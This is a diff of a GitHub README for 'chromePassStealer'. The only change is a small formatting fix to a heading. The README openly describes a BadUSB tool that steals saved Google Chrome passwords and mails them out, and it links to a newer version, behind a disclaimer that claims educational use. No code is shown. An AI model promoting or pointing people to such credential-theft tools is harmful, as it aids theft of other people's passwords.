@@ -1,6 +1,6 @@
 # chromePassStealer 🥷
 This project allows you to steal passwords from **Google Chrome** and get all the data by mail.
-#This project isn't updated, if you want a better script click [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer)
+# This project isn't updated, if you want a better script click [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer)
 # Warning ⚠️
 Everything in this repository is **strictly** for educational purposes. Notice **I am not responsible** for stolen data. **You are responsible** for your actions using developed script for **BadUSB**
 # About ℹ️
